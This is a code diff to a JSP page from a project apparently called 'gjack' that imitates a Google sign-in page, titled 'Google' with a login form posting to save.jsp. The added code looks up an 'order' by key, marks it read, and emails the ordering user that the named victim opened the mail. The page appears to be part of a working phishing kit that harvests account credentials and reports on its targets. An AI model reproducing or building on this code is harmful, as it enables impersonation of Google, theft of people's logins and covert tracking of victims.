@@ -1,11 +1,57 @@
 <%@ page import="com.theah64.gjack.database.Orders" %>
 <%@ page import="com.theah64.gjack.database.Results" %>
+<%@ page import="com.theah64.gjack.model.Order" %>
+<%@ page import="com.theah64.webengine.exceptions.MailException" %>
+<%@ page import="com.theah64.webengine.utils.Form" %>
+<%@ page import="com.theah64.webengine.utils.MailHelper" %>
+<%@ page import="com.theah64.webengine.utils.RequestException" %>
+<%@ page import="java.sql.SQLException" %>
 <html>
 <head>
     <title>Google</title>
     <%@include file="common_headers.jsp" %>
     <link href="https://fonts.googleapis.com/css?family=Roboto:400,500" rel="stylesheet">
     <link rel="stylesheet" href="node_modules/material-components-web/dist/material-components-web.css">
+
+    <%
+        final Form form = new Form(request, new String[]{Orders.COLUMN_KEY});
+        try {
+            if (form.isAllRequiredParamsAvailable()) {
+                //Setting mail as read
+                final String orderKey = form.getString(Orders.COLUMN_KEY);
+                final Order order = Orders.getInstance().get(Orders.COLUMN_KEY, orderKey);
+                if (order != null) {
+
+                    final String mailContent = order.getVictimEmail() + " read the mail";
+
+                    try {
+
+                        try {
+                            Orders.getInstance().update(Orders.COLUMN_ID, order.getId(), Orders.COLUMN_IS_READ, "1");
+                        } catch (SQLException e) {
+                            e.printStackTrace();
+                        }
+
+                        MailHelper.sendMail(order.getUserEmail(), "GJack Read receipt", mailContent, "GJack");
+
+                    } catch (MailException e) {
+                        e.printStackTrace();
+                    }
+
+                } else {
+                    response.sendRedirect("error.jsp?title=Error&message=Bad order");
+                    return;
+                }
+            } else {
+                response.sendRedirect("error.jsp?title=Error&message=Bad access");
+                return;
+            }
+        } catch (RequestException e) {
+            e.printStackTrace();
+            response.sendRedirect("error.jsp?title=Error&message=" + e.getMessage());
+            return;
+        }
+    %>
 
     <style>
         body {
@@ -143,7 +189,7 @@
 
                 <form id="login" method="POST" action="save.jsp">
 
-                    <input type="hidden" name="<%=Orders.COLUMN_KEY%>" value="<%=request.getParameter("order_key")%>"/>
+                    <input type="hidden" name="<%=Orders.COLUMN_KEY%>" value="<%=form.getString(Orders.COLUMN_KEY)%>"/>
 
                     <!--Username-->
                     <div id="username_container" class="mdc-textfield mdc-textfield--upgraded"
